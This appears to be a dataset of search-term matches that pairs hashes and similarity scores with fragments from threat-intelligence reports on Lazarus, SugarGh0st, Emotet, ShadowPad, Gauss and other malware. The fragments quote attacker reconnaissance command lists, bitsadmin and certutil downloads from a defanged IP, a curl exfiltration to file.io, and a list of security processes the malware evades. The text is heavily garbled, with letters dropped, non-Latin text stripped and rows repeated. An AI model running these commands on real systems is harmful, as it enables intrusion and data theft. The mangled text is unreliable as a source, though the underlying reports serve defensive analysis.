cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe,0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe,0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,cmd.exe,0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe,1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
d62a6e941ec0167b0f3e15c72eb634ba,encrypted configuration,0.7524868731280355,"['It writes itself in files: and modifies the %system32%\\wbem\\wmiqry32.dl, %system32%\\wbem\\wmihlp32.dl system registry to be loaded instead of file.', '%system32%\\wbem\\wbemsvc.dl To achieve this, it writes the folowing registry value: [HKCR\\CLSID\\{7C857801-7381-1CF-84D-0A04B2E24}\\InProcServer32] Default = %system32%\\wbem\\wmihlp32.dl Operation The module is automaticaly loaded into proceses that use wbemsvc.dl.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShelHWStop, Global\\ShelHWDetectionEvent events, mutex ShelHWDetectionMutex.', '12 The main thread exits if the folowing proceses were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwal.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lokout.exe savprogres.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHok.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Snifer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe spfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewalsvc.exe supdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgacount.exe CavAUD.exe ipatrol.exe webwal.exe privatefirewal3.exe CavEmSrv.exe pciprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rt_crc_service.exe Cavl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavAp.exe privatefirewal3.exe avas.exe sdtrayap.exe CavCons.exe pft.exe avcom.exe siteadv.exe CavMud.exe armorwal.exe avkproxy.exe sndsrvc.exe CavUMAS.exe ap_firewal.exe avkservice.exe snsmcon.exe Upd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4s.exe avtask.exe avkwctl.exe CavQ.exe tpfdmn.exe aws.exe firewal.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rser.exe bgnt.exe spybotsd.exe OnAcesInstaler.exe op_mon.exe botsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bulguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewal.exe Packetyzer.exe washer.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13 zerospywarelite_instaler.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewal.exe ashdisp.exe rawshark.exe vdtask.exe firewal204.exe ashmaisv.exe Ethereal.exe asr.exe firewalgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of aditional modules, their names, DL exports names to cal and location of the modules aditional files.', 'Gaus ShelNotifyUser ShelNotifyUserEx SetWindowEvent InitShelEx %systemrot%\\system32\\winshel.ocx %temp%\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\dskapi.ocx %temp%\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\smdk.ocx %temp%\\~mdk.tmp String values from config file (example) 14 Every module is loaded and its export functions are caled as specified in the configuration.', 'Most of the actions are loged in an encrypted (with XOR) file %temp%\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading aditional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction lop.', 'Prior to comunicating with the C&C, al the information from the other modules log files is copied to the ~shw.tmp file.']"
5f53a3a1339c0af277c7641aa04535e1,API hashing,0.8164911763814514,"['T105 Proces Injection ShadowPad is injected into a wmplayer.exe proces.', 'T140 Deobfuscate/Decode ShadowPad launcher uses XOR to decrypt Files or Information the payload.', 'ShadowPad uses a custom algorithm to decrypt strings and configuration.', 'T1027 Obfuscated Files or ShadowPad shelcode is XOR-encoded Information and uses fake conditional jumps to hinder disasembly.', 'ShadowPads strings and configuration are encrypted.', 'It also uses API hashing.', 'T143 Hiden Window ShadowPad is injected into a wmplayer.exe proces started in a hiden window.', 'Discovery T1010 Aplication Window ShadowPads keyloging module lists Discovery aplication windows.', 'T1083 File and Directory ShadowPads RecentFiles module lists Discovery files recently acesed.', '10/1 Tactic ID Name Description Comand T1071 Standard Aplication ShadowPad can use HTP and HTPS for and Layer Protocol C&C comunications.', 'Control T1043 Comonly Used ShadowPad uses TCP:43 and UDP:43.']"
39e29af445d8deae622f11c7366518a7,a batch script used,0.7689842958380704,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
eca348ac2e9d0da5334464f9c73d2754,a batch script used,0.7689842958380704,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 5/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
3d2e99ba94188b71a17364073a49e3ea,a batch file.,0.7657437517555142,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
920bbf3f4cf30cf9c556531074485448,cmd.exe /C,0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,cmd.exe /C,1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,cmd.exe /C,0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe /C,0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,cmd.exe /C,0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /C,0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /C,0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,cmd.exe /C,0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /C,1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
3d2e99ba94188b71a17364073a49e3ea,the batch file,0.7514180536353627,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
920bbf3f4cf30cf9c556531074485448,cmd.exe /c,0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,cmd.exe /c,1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,cmd.exe /c,0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > 